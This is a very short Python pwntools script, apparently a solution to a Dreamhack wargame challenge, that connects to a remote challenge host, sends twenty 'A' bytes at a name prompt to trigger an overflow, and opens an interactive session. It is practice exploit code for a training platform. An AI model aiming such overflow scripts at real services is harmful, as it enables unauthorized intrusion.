from pwn import *

hosts = 'host1.dreamhack.games'
port = 17757

p = remote(hosts,port)

payload = b'A'*20

p.sendafter('Name: ',payload)

p.interactive()
